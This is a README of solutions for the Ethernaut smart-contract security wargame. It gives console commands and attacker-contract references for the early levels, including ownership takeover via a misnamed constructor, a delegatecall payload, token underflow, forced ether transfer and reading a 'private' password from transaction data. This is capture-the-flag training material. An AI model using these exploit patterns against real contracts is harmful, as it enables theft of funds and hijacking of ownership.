# Ethernaut Solutions
Solutions for Ethernaut. (At the moment, there are only the solutions without the explanations)



### Hello Ethernaut
Run on the console
```
contract.authenticate("ethernaut0")
```

### Fallback
Run on the console
```
contract.contribute({value:toWei('0.0001')})
sendTransaction({to: instance, from: player, value: toWei('0.0001')})
contract.withdraw()
```

### Fallout
Run on the console
```
contract.Fal1out()
```

### Coin Flip
deploy [coin-flip/Flipper.sol](coin-flip/Flipper.sol) and execute ```flip()``` 10 times


### Telephone
deploy [telephone/Middleware.sol](telephone/Middleware.sol) and execute ```changeOwner()```


### Token
deploy [token/Underflow.sol](token/Underflow.sol) and execute ```transfer(yourAddressHere)```
```

### Delegation
Run on the console
```
sendTransaction({to:instance, from:player, data:'0xdd365b8b'})
```

### Force
deploy [force/Forcer.sol](force/Forcer.sol), send some eth, and execute ```send()```

### Vault
Password is in Etherscan > Instance > From > Txn Hash > Input Data
Run on the console
```
contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
